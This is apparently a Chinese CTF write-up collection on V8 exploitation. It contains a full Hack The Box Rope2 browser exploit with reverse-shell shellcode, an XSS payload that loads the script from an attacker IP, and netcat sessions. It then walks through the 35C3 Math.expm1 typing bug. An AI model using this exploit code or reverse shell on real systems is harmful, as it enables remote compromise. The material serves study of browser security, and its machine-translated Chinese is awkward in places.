┌──(root💀kali)-[~/test]
└─# nc -lvp 4222
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4222
Ncat: Listening on 0.0.0.0:4222
Ncat: Connection from 192.168.177.151.
Ncat: Connection from 192.168.177.151:47072.
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
uname -a
Linux luci 4.15.0-132-generic #136~16.04.1-Ubuntu SMP Tue Jan 12 18:22:20 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb168.jpg)


在d8上有效,必须试试之前从端口8000下载的chrome二进制文件,运行攻击测试,制作一个HTML文件包含xpl.js文件,这里的想法是使用--no-sandbox最终意味着没有沙箱逃逸是和系统上执行的所有JIT代码HTML文件本身:

``` bash
<html>
    <head>
       <script src="xpl.js"></script>
    </head>
</html>
```

运行给定的chrome二进制文件:./chrome/chrome --no-sandbox ./xpl.html会反弹一个reverse shell:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb169.jpg)

``` bash
┌──(root💀kali)-[~/test]
└─# nc -lvp 4222
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4222
Ncat: Listening on 0.0.0.0:4222
Ncat: Connection from 192.168.177.151.
Ncat: Connection from 192.168.177.151:54750.
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
uname -a
Linux luci 4.15.0-132-generic #136~16.04.1-Ubuntu SMP Tue Jan 12 18:22:20 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

漏洞利用成功

现在，先把这个放在一边，首先重新更改ip地址然后生成shellcode，使用这个漏洞来获得reverse shell，最终的漏洞利用js脚本看起来像这样:


``` bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4222 -f num

0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 
0xb9, 0x02, 0x00, 0x10, 0x7e, 0x0a, 0x0a, 0x0e, 0x0c, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 
0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 
0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 
0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
```

 - xpl.js

``` bash
var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];
var obj = {"A":1.1};
var reg = [1, 2, 3, 4];


var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {

    f64_buf[0] = val;

    if(size == 32) {
        return BigInt(u64_buf[0]);
    } else if(size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

}

function itof(val, size) {

    if(size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if(size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }

    return f64_buf[0];

}


var float_arr_map = ftoi(float_arr.GetLastElement(), 32)
var reg_arr_map = float_arr_map - 0xa0n;

console.log("[*] Float array map   :  0x" + float_arr_map.toString(16));
console.log("[*] Regular array map :  0x" + reg_arr_map.toString(16));


function addrof(in_obj) {
	float_arr.SetLastElement(itof(reg_arr_map, 32));
	float_arr[0] = in_obj;
	float_arr.SetLastElement(itof(float_arr_map, 32));
	let addr = float_arr[0];
	return ftoi(addr, 64)
}


function fakeobj(addr) {
	float_arr[0] = itof(addr, 32);
	float_arr.SetLastElement(itof(reg_arr_map, 32));
	let fake = float_arr[0];
	float_arr.SetLastElement(itof(float_arr_map, 32));
	return fake;
}

var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3];
var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;

console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));

function arb_read(addr) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    return ftoi(fake[0], 64);
}

function arb_write(addr, value) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    fake[0] = itof(value, 64);
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
                               130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,
                               128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,
                               128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,
                               0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
var rwx = arb_read(wasm_instance_addr + 0x68n & 0xffffffffn);

console.log("[+] Wasm instance address: 0x" + wasm_instance_addr.toString(16));

console.log("[*] RWX INSTANCE:   0x" + rwx.toString(16));


var arr_buf = new ArrayBuffer(0x100);
var dataview = new DataView(arr_buf);

var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;;
var back_store_addr = arb_read(arr_buf_addr + 0x14n);

console.log("[+] ArrayBuffer address: 0x" + arr_buf_addr.toString(16));
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [
    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 
    0xb9, 0x02, 0x00, 0x10, 0x7e, 0x0a, 0x0a, 0x0e, 0x0c, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 
    0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 
    0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 
    0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
];  // shellcode for spawning a reverse shell

for (let i = 0; i < shellcode.length; i++) {
  dataview.setUint8(i, shellcode[i], true);
}

console.log("[+] Spawning a shell...");
pwn();
```

现在，问题是，应该把这个漏洞利用在哪里，在任何端口上都没有运行chrome实例，但随后,端口8000,在这一点上,评论模板可能XSS漏洞,这是唯一的方法,似乎可行,所以exploit

``` bash
<script src="http://10.10.14.12/xpl.js"></script>
```

插入到消息框中,netcat监听器等待连接,得到了chromeuser的shell

``` bash
root@luci:~/v8build/rope2# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.196 - - [24/Jan/2021 00:50:08] "GET /xpl.js HTTP/1.1" 200 -
10.10.10.196 - - [24/Jan/2021 00:50:31] "GET /xpl.js HTTP/1.1" 200 
```

``` bash
root@luci:/home/user# nc -lvp 4222
Listening on [0.0.0.0] (family 0, port 4222)
Connection from [10.10.10.196] port 4222 [tcp/*] accepted (family 2, sport 59342)
id
uid=1001(chromeuser) gid=1001(chromeuser) groups=1001(chromeuser)
whoami
chromeuser
pwd
/home/chromeuser/web
ls
chrome.tar.gz
main.py
output
templates
uname -a
Linux rope2 5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:109::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
landscape:x:107:114::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:108:1::/var/cache/pollinate:/bin/false
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
r4j:x:1000:1000:r4j:/home/r4j:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
chromeuser:x:1001:1001:,,,:/home/chromeuser:/bin/bash
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
gitlab-www:x:997:997::/var/opt/gitlab/nginx:/bin/false
git:x:996:996::/var/opt/gitlab:/bin/sh
gitlab-redis:x:995:995::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:994:994::/var/opt/gitlab/postgresql:/bin/sh
gitlab-prometheus:x:993:993::/var/opt/gitlab/prometheus:/bin/sh
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb170.jpg)

we finally success! amazing!
<!-- kb:end chrome-browserv8-pwn -->

</details>

<a id="case-exploiting-the-math-expm1-typing-bug-in-v8"></a>

## 负零类型推断与越界原语

35C3 题目围绕 Math.expm1 的类型信息与优化阶段展开，保留从错误边界推断到数组长度破坏、ArrayBuffer 任意读写的推导。

<p class="kb-provenance">来源 Exploiting-the-Math-expm1-typing-bug-in-V8 · 原记录 2021-02-15 · 31 个代码块 · 7 处图片引用</p>

<details class="kb-evidence" id="record-exploiting-the-math-expm1-typing-bug-in-v8">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Exploiting-the-Math-expm1-typing-bug-in-V8 -->

``` bash
Minus zero behaves like zero, right?
```

喜欢浏览器漏洞利用。是破坏了我认为是每天运行的最复杂的软件之一. 在[35C3 CTF](https://ctftime.org/event/718) 今年(和KJC + mhackeroni一起比赛，获得了第一名!) 这有一个Chrome挑战关于利用一个v8[漏洞](https://bugs.chromium.org/p/project-zero/issues/detail?id=1710), Chrome的 JavaScript引擎. 这个错误在静态分析期间导致了不正确的输入, 在即时编译的代码中产生不正确的优化. 这真的很难触发: 没能在CTF中及时完成, 但我觉得很多人会对一篇完整的WRITEUP感兴趣. [@_tsuro](https://twitter.com/_tsuro)感谢你一开始就找到了漏洞，也感谢你所面临的巨大挑战, 还有ESPR的精彩CTF!



``` bash
Krautflare的员工是无服务器计算领域的最新突破。由于非常重视安全性，甚至将客户的工作负载相互隔离!

在演示中, 添加了一个古老的v8漏洞，以表明它是不可利用的! 移步https://bugs.chromium.org/p/project-zero/issues/detail?id=1710 查看细节. 幸运的是，这是v8的最后一个漏洞，从现在起产品将是安全的.

文件在: https://35c3ctf.ccc.ac/uploads/krautflare-33ce1021f2353607a9d4cc0af02b0b28.tar

挑战在: nc 35.246.172.142 1

注释: 这个挑战很难! 它是为有的人在pwnable上要求的, 在这个推文中: https://twitter.com/_tsuro/status/1057676059586560000. 尽管上面链接的错误给了一个如何利用它的粗略的演练，只需要找出细节。希望你在编译器讲座上注意了:)。祝好运，已经警告过你了!
```

#### The bug

浏览一下bug报告，它给出了一个粗略的演练，并尝试解析它。

``` bash
该类型设置Math.expm1为Union(PlainNumber, NaN)。这缺少了-0 的情况: Math.expm1(-0) 返回 -0。
```

现代的JS引擎，如V8，对JS代码执行即时(JIT)编译，也就是说，它们将JavaScript转换为本机代码，以便更快地执行。在点火解释器执行一个函数多次后，该代码被标记为热路径，并由Turbofan JIT编译器编译。显然，我们希望尽可能地优化代码。因此，V8的优化管道大量使用了静态分析。感兴趣的最重要的属性之一是类型: 由于JavaScript是一种非常动态的语言，知道在运行时可以看到什么类型对于优化是至关重要的。

分析管道的一个组件是类型。它的作用是处理代码的中间表示中的节点，并根据可能的输入类型计算可能的输出类型。例如，一个常见的类型是range: 如果一个节点输出range(1,3)，这意味着它可以有1、2或3的值。

在本例中，输入器表示Math.expm1的类型函数总是Union(PlainNumber, NaN) (see buggy [typer.cc](https://cs.chromium.org/chromium/src/v8/src/compiler/typer.cc?rcl=9680338c622d4693f984b49fb24d101acd2d8112&l=1437)和[operation-typer.cc](https://cs.chromium.org/chromium/src/v8/src/compiler/operation-typer.cc?rcl=9680338c622d4693f984b49fb24d101acd2d8112&l=420)). 这意味着输出要么是一个纯数字，要么是一个浮点NaN。plain - number类型表示除-0之外的任何浮点数。是的，浮点数有一个 - 0。然而，在运行时，Math.expm(-0)恰好是-0。因此，typer对类型做出了错误的假设。这种类型将传播到其他操作: 也许可以从中得到一个与安全相关的错误优化。

``` bash
发现可以区分0和-0的有趣案例是除法，atan2和Object.is。在前两种情况中，输入代码不处理负0，因此只剩下Object.is。
```

下一个自然的问题是: -0在哪里会产生影响? 基本上，唯一有趣的情况是Object.is(Math.expm1(-0)， -0)。如果检查一下数学的结果。expm1是-0，输入者认为答案总是假的，但它在运行时可能为真或假。

``` bash
事实上，这个typer运行了3次:

1. 在typer阶段
2. 在TypeNarrowingReducer(负载消除阶段)
3. 在简化的降低阶段

在前两次输入运行之后，ConstantFoldingReducer将运行，所以如果让输入者标记对象。is result始终为false此时，它将被替换为一个假常数。这就剩下第三轮typing了。
```

好吧，这里有一堆V8内部组件: 稍后再看。主要的一点是，该类型在管道中有多次运行，其间穿插着各种优化过程。如果typer过早发现在比较数学。expm1到-0，它只是将比较折叠成一个假常数(这并不完全发生在ConstantFoldingReducer中，稍后会更好地看到它)。这对我们来说是没有用的: 从功能的角度来看，代码是不正确的，但没有安全问题。另一方面，不想让输入器太晚发现-0比较，否则就不会得到正在寻找的错误优化。在我看来，这是整个行动的关键所在。

``` bash
对象。此时，is调用可以用两种形式表示。作为ObjectIsMinusZero节点，如果先前的pass知道比较-0或作为SameValue节点。ObjectIsMinusZero的情况似乎并不有趣，因为类型信息没有在UpdateFeedbackType函数中传播。相同值的反馈类型会被传播，并且会被用于范围计算(现在有bug)。
```

对象。is调用以中间表示的SameValue节点开始。在被称为TypedOptimization的传递中，SameValue节点可以被简化为更特殊的节点(请参阅中ReduceSameValue) [typed-optimization.cc](https://cs.chromium.org/chromium/src/v8/src/compiler/typed-optimization.cc?rcl=dde25872f58951bb0148cf43d6a504ab2f280485&l=504)). 在我们的例子中，因为我们在比较一些东西(数学。expm1 result)使用-0时，TypedOptimization将用专门的ObjectIsMinusZero替换相同的值。展望未来，我们要做破坏的输入通道被简化了 ([simplified-lowering.cc](https://cs.chromium.org/chromium/src/v8/src/compiler/simplified-lowering.cc?rcl=dde25872f58951bb0148cf43d6a504ab2f280485&l=3079)). 这是管道中的第三种(也是最后一种)类型，它传播相同值节点的类型信息，但不传播专门的ObjectIsMinusZero节点的类型信息。需要类型传播来导致不正确的优化，因此希望避免转换为ObjectIsMinusZero: 像上面一样，不希望优化器过早地发现我们正在与-0进行比较。

``` bash
然而，还有一个障碍你需要克服。使用朴素的方法，图中将有一个FloatExpm1节点。该节点输出一个浮点数，而相同值的节点需要一个指针作为输入，因此编译器将插入一个ChangeFloat64ToTagged节点进行转换。因为类型信息说输入永远不可能是-0，所以它不包括特殊的-0处理，我们的-0将被截断为常规的0。
```

Math.expm1操作将降低到FloatExpm1节点，该节点接受一个浮点数作为输入，并输出一个浮点数，该浮点数将成为SameValue的输入。然而，有两种可能的方法来表示浮点数: 作为“原始”浮点数，或作为标记的值(可以表示浮点数或对象)。FloatExpm1输出一个原始浮点数，但是SameValue接受一个带标记的值(因为它可以接受所有类型的对象)。因此，编译器插入一个ChangeFloat64ToTagged节点，以将原始浮点数转换为带标记的值。因为编译器认为ChangeFloat64ToTagged的输入永远不会是-0，所以它不会生成处理-0的代码。在运行时，来自Math的-0。expm1将被截断为0，破坏我们的努力。听起来像是个大问题...

``` bash
但是，也可以将其改为Call节点，它将返回一个带标记的值，并且不会发生转换。
```

FloatExpm1只接受浮点数，但如果你尝试计算Math.expm1("0")(传递一个字符串)，你会得到NaN，而不是某种错误。所以必须有一种方法让它接受非数参数。答案是V8包含了一个内置的Math.expm1实现，能够处理所有输入类型。如果可以强制Turbofan调用内置函数而不是使用FloatExpm1，会得到一个调用节点。不同的是，调用已经返回了一个标记的值，所以不需要ChangeFloat64ToTagged，并且-0不会被截断为0。

``` bash
然后，可以在javascript数组中使用通常的检查边界消除和OOB RW结果。
```

这是正在寻找的错误优化。JavaScript数组访问由CheckBounds节点保护，该节点确保索引在数组边界内。如果优化器可以静态地确定索引始终处于范围内，那么它可以消除CheckBounds节点。将索引与对象的结果相联系的图像。is: 由于输入信息是关闭的，可以让分析器认为索引总是在范围内，而它在运行时可能是在范围外。优化器将错误地消除CheckBounds，使能够对JS数组进行OOB访问，可以使用它来构建更强大的开发原语。

#### 重述bug

这是bug报告中的PoC:

``` bash
function foo() {
    return Object.is(Math.expm1(-0), -0);
}

console.log(foo());
%OptimizeFunctionOnNextCall(foo);
console.log(foo());
```

这必须与d8 --allow-native-syntax 一起运行。第一次打印将输出true: 代码被解释并执行正确的操作。然后，优化foo并将输出更改为false: 优化器使用了错误的输入信息和折叠对象。是进了一个不变的假。

问题是，当在挑战的d8中尝试这个PoC时，它不起作用: 第二个打印仍然是正确的。可以使用turbolizer(v8/tools/turbolizer)来可视化Turbofan在每个优化阶段的IR，并找出发生了什么。通过传递-trace-turbo到d8，它将产生跟踪文件，可以导入Turbolizer。选择'simplified lowering'阶段(这是感兴趣的最后一个阶段)，单击T来显示类型，然后单击四个展开箭头来显示所有节点，然后单击圆形箭头来布局它们。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v8.png)

从图的这一部分中, 看到了所期望的: 一个FloatExpm1节点，它进入numberisminus 0，然后返回(转换为tagged后)。FloatExpm1的类型为Number，其中包括-0。不应该是PlainNumber或者NaN吗? 发生什么事情了? 原因可以在revert-bugfix-880207.patch文件中找到。重新引入错误。只打补丁typer.cc,不是operation-typer.cc: 因此，这个bug只在调用内置函数时出现，而不是在FloatExpm1上。反正也得生成call，现在就开始吧。

FloatExpm1是一个针对数字输入的优化节点: 编译器推测输入将是一个数字。如果它在运行时确实是一个数字，很好，它将继续执行优化的代码。如果它不是一个数字，优化后的函数将退出解释器: 这个过程称为反优化。解释器将使用内置，它可以接受所有类型。下一次编译函数时，Turbofan会得到反馈信息，通知它输入并不总是一个数字，并且会产生一个对内置函数的调用，而不是FloatExpm1。

我们来做一下。将使用循环来触发编译，而不是本地语法，因为在实际运行漏洞时不会使用它。

``` bash
function foo(x) {
    return Object.is(Math.expm1(x), -0);
}

foo(0);
for(let i = 0; i < 100000; i++)
    foo("0");
console.log(foo(-0));
```

这将打印为false。在运行它时，您将注意到函数现在编译了两次。可以添加--trace-deopt标志来通知取消优化。首先，foo将被解释。一段时间后，假设x是一个数字，就会对它进行编译和乐观优化。第一次调用编译后的函数(x作为字符串)时，得到了反优化:

``` bash
[...]
;;; 反优化在 <poc2.js:2:27>, 不是数字，也不是Oddball
[...]
从反优化更新反馈在 <poc2.js:2:27>, 不是数字，也不是Oddball
```

它在更新类型反馈，告诉Turbofan不要把x当成一个数字。第二次编译函数时，Turbofan会生成一个对内置函数的调用。会看到现在有两个Turbolizer痕迹。最近显示的是一个类型为PlainNumber或NaN的呼叫节点，正如所期望的那样。

一开始你可能会问foo(0)的目的是什么。老实说，还没有完全搞清楚: 有人可能认为它需要提供数字反馈，但可以在console.log之后移动它，它仍然可以工作(Turbofan在这种情况下默认是乐观的)。然而，如果删除它，它将不再工作。相信这和主体中foo的一些内联有关，但是肯定想知道更多关于这方面的信息。有什么主意就告诉给我!

复制这个错误。下一步: 在JS数组上获得OOB。

#### 触发OOB访问

如前所述，其思想是使数组的索引依赖于对象的结果。这样分析器就会假定索引总是在范围内。例如，考虑foo:

``` bash
function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let b = Object.is(Math.expm1(x), -0);
    return a[b * 1337];
}
```

正在尝试读取OOB，因为很容易看到它。通过使用赋值，它可以轻松地成为一个写入OOB。如果b为false，则访问索引0: 因为a的长度是已知的，所以优化器可以确定这是静态的。如果b为真，访问索引1337，这是越界的。优化器认为b只能是假的，所以它将消除边界检查。我不会在这个例子上浪费时间: 很明显，b将被折叠为一个常量false(就像在PoC中一样)，所以总是访问索引0。

可以通过将-0作为参数来添加间接变量:

``` bash
function foo(x, y) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let b = Object.is(Math.expm1(x), y);
    return a[b * 1337];
}
// 更新 foo(...) 到 foo(..., -0)
```

这次得到了undefined:

``` bash
;;; 反优化在 <poc3.js:4:13>, 界外
```

不是折叠了，但也不会去掉边界检查。检查一下Turbolizer(简化降低).

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v81.png)

保留了一个SameValue节点，但它的类型是布尔型而不是单例false型。这意味着分析者认为它可能是真的也可能是假的。这会传播，为索引提供一个范围(0,1337)，这显然不允许边界检查消除。往回看，发现y作为[2]节点的形参，具有NotInternal类型。这意味着分析器不知道y的类型，确切地说，它不知道它总是-0。

在这一点上，决定有条不紊。学习一下Turbofan管道(见pipeline.cc)并发现:

 - 最后阶段Object.is为false可能发生: 在此之前，不想让分析器知道正在与-0进行比较。

 - 类型发生的最后一个阶段: 希望分析器知道在此之前与-0进行比较，以便信息传播。

最后一轮输入是在简化的降低阶段。这是到那时为止的Turbofan优化管道:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v82.png)

每个阶段都有很多传递，在右边报告了一些相关的，标记了输入传递发生的地方。

看看折叠是如何发生的。ConstantFoldingReducer将传播-0常量(例如，如果使用的变量的常量值为-0)。正如之前观察到的，TypedOptimization将把与常量-0比较的相同值节点减少为ObjectIsMinusZero节点。稍后在管道中，simpledlowering传递可以在ObjectIsMinusZero节点上执行进一步的缩减 ([simplified-lowering.cc](https://cs.chromium.org/chromium/src/v8/src/compiler/simplified-lowering.cc?rcl=dde25872f58951bb0148cf43d6a504ab2f280485&l=3079)). 由于math.expm1静态类型不包括-0, simplefedlowering会将ObjectIsMinusZero节点折叠成一个假常量。因此，在输入UpdateFeedbackType时，它将从SameValue节点传播类型信息，但不会进一步减少它们。保持相同的值意味着，直到最后一次类型优化之后，分析器才会知道正在与-0进行比较。

这留下了两个选择。要么在转义分析期间获得信息，要么在类型运行之前进行简化的降低过程中获得信息。简化的降低还为值选择机器表示，并在输入之前反向传播表示反馈。这就是在行动中搞砸的地方。虽然很熟悉V8的代码库，但要弄清楚这篇文章中列出的所有内部结构很累。在查看管道时，大脑跳过了escape分析(可能是因为它被包裹在一个条件中)，认为必须使用简化的降低。剧透警告: 你不会有任何进展的。教训: 通过橡皮鸭重新运行你的系统方法。

快速复习一下逃逸分析。这段代码:

``` bash
function f() {
    let o = {a: 5};
    return o.a;
}
```

显然，它可以重写为:

``` bash
function f() {
    let o_a = 5;
    return o_a;
}
```

虽然o必须是一个具体的堆分配，但o_a可以被非物化，并在堆栈或寄存器变量中转换(更有效)，或常量折叠到return语句中。

现在在中间添加一个对函数g的调用:

``` bash
function f() {
    let o = {a: 5};
    g(o);
    return o.a;
}
```

优化不再有效，因为g可以在全局变量中保存对o的引用。因此，不能在堆栈分配中转换o，因为全局引用的寿命会比堆栈变量长，而堆栈变量只有在f的作用域是活的时才有效。o已经逃离了f的范围: 逃离分析的目标是识别哪些对象逃脱了，这样非逃脱的对象就可以被去物化。

这意味着，在escape分析运行之前，分析器将o.a视为通过对象引用访问一个字段:它不知道它的类型，因为它不能对o做出假设。这对我们来说是完美的。代码比语言更响亮:

``` bash
function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);
    return a[b * 1337];
}
```

现在是Object.is的第二个参数是o中的字段mz。在转义分析之前，分析器不知道它是一个常量-0，所以TypedOptimization将保持一个相同的值节点。escape分析发现，o不会逃脱，并将它去物化并传播常数，所以在简化降低之前，得到一个相同的值，其常数为-0。然后，最后一次输入运行将确定SameValue始终为false，并传播此信息，从而消除边界检查。实际上，如果运行这段代码，它将返回“奇怪的”值，因为它从堆中读取超过数组边界的内存(尝试使用索引)。

太好了，有机会了! 不过，这仅仅是一个开始: 需要在此基础上构建几个原语。

#### JavaScript 利用原语

JavaScript的利用遵循某些常见的模式。在这个漏洞的基础上，漏洞作者构建了更抽象的原语，这在损坏的内存中提供了更多的自由。

两个常见的原语是addrof和fakeobj。addrof原语接受一个对象，并给我们该对象的内存地址。这是必需的，因为现代系统采用了ASLR(地址空间布局随机化)，因此内存区域(代码、堆、库、堆栈……)的位置是随机的，攻击者是不知道的。此外，JS引擎的堆非常拥挤，因此预测对象的地址是脆弱的。fakeobj原语获取一个内存地址，并返回由该内存支持的对象引用。通过获取由攻击者控制的缓冲区支持的引用，它可以用来制作假JavaScript对象。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v83.png)

当bug是OOB时，通常的设置是有一个double数组A，可以在其上执行OOB访问，并在内存中放置一个具有内联属性(或对象数组)B的对象A之后。假设攻击者知道两者之间的偏移量(可以在运行时找到)，因此A上的OOB可以用来访问B的内存。诀窍在于，通过内存的访问是双精度访问(假设元素是不打包的快速双精度访问)，而B包含指向对象的指针。为了实现addrof，将对象赋值给B的属性: 这将把对象的地址存储在B的内存单元中。然后，使用A上的OOB将该内存单元读为double，并将其解码为整数(它们的内存表示不同)。fakeobj原语是对称的。将对象的地址编码为double，然后使用a上的OOB将其存储到B的内存中: 现在B的属性包含了对假对象的引用，可以返回它。

最强大的原语是任意读/写，它允许在任何内存地址读或写数据。它通常是通过 [ArrayBuffer](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer). 在内部，后备缓冲区是行外存储的，ArrayBuffer对象包括一个指向它的指针和它的大小。因此，攻击者控制的ArrayBuffer可以指向内存中的任何地方。这对于普通数组也是可能的，但是ArrayBuffer还有另一个优点: 它可以覆盖[typed arrays](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray) 和 [DataView](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView) 可以很容易地操作原始内存。ArrayBuffer可以通过两种方式构建: 使用一些其他的原语(例如，稳定OOB)来破坏现有ArrayBuffer的指针和大小，或者通过fakeobj原语来构建一个伪ArrayBuffer。

回到bug。理想情况下，为了正确地封装OOB，需要一个接受数组、索引并执行OOB(读或写)的函数。取任何索引都很简单，只需要让输入者相信你在用一个数字乘以b(例如，按位和用数字)。MAX_SAFE_INTEGER乘法之前)。然而，发现扩展到任何数组都是非常脆弱的。如果有一种方法可以让它工作，不会感到惊讶，但发现很难保持输入信息的完整性，并让优化器消除边界检查，这也是因为在优化流程中已经很晚了。相反，决定接受这个OOB转瞬即逝的特性，并且只使用它一次来构建一个更可靠和可重复的OOB。

想法是这样梳理堆将在应用错误的数组后分配三个对象(将其称为origin数组):

 - 一个快速双精度数组，称之为OOB数组;
 - 具有内联属性的对象，受害者对象;
 - ArrayBuffer，受害者缓冲区.

将保留对这三个对象的全局引用，以备以后使用。两个受害者的顺序不重要，只要他们在OOB数组之后。使用这种布局，可以使用原始数组OOB将OOB数组的长度破坏为一个较大的值。现在OOB数组通过普通的元素访问为我们提供了可重复的OOB。然后，可以使用面向对象的方法实现受害者对象的addrof原语，使用面向对象的方法实现受害者缓冲区的任意读/写。不需要fakeobj。

#### 构建原语

这就是我们所追求的堆布局:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v84.png)

每个JavaScript数组是由两个堆对象: JSArray, 代表实际的JavaScript数组对象, 和一个FixedArray内部固定大小的数组类型用作后备存储器数组元素(这适用于数组没有或很少有洞,否则,就会降级为一个字典对象)。两者都有长度字段。对于JSArray，它是实际的JavaScript长度(在数组访问期间检查)。对于FixedArray，它是后备存储的长度，可以大于JavaScript数组的大小(在过度分配的情况下)。JSArray和FixedArray的顺序可能不同，但动态地找到它们，因此这无关紧要。

